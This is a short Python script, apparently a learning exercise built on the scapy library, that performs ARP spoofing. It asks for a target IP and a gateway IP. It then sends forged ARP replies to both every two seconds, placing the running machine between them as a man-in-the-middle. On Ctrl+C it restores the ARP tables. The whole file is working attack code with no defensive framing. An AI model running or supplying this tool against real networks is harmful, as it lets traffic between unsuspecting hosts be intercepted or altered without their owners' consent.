#!/usr/lib/env python

import sys
import time
import scapy.all as scapy


def get_mac(ip):
    arp_reaquest=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_reaquest_broadcast=broadcast/arp_reaquest

    ans_list=scapy.srp(arp_reaquest_broadcast,timeout=1,verbose=False)[0]

    return ans_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)

    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)

    scapy.send(packet,verbose=False)

def restore_ARP_TABLE(destination_ip,gateway_ip):
    destination_mac=get_mac(destination_ip)
    gateway_mac=get_mac(gateway_ip)

    packet=scapy.ARP(pdst=destination_ip,hwdst=destination_mac,psrc=gateway_ip,hwsrc=gateway_mac)

    scapy.send(packet,count=4,verbose=False)


Target_ip=raw_input("Target_IP= ")
Gateway_ip=raw_input("Gateway_IP= ")


try:
    packet_sent_count=0
    while True:
        spoof(Target_ip,Gateway_ip)
        spoof(Gateway_ip,Target_ip)
        packet_sent_count+=2

        print("\rPacket sent= "+str(packet_sent_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+]Ctrl+c detected.........Resseting ARP tables......Please wait")
    restore_ARP_TABLE(Target_ip,Gateway_ip)
    restore_ARP_TABLE(Gateway_ip,Target_ip)

